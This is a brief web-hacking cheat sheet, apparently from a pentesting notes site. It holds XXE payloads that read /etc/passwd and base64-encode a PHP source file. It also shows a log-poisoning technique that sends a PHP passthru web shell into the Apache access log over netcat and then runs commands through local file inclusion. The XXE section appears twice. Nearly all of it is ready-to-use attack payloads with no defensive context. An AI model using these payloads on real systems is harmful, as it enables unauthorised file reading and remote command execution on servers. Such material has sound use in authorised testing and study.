---
title: web
weight: 20
---

# XML External Entity (XXE)
----------------

Read local files

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```

Read binary or files that otherwise can't be display (.php)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```
----------------

# LFI via nc
----------------

logfile injection
```shell
nc target-ip target-port
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: <IP>
Connection: close
```
        
Afterwards include the it via lfi
```shell
?lfi_file=/var/log/apache2/access.log&cmd=<command>
```
----------------

# XML External Entity (XXE)
----------------

Read local files

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```

Read binary or files that otherwise can't be display (.php)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```
----------------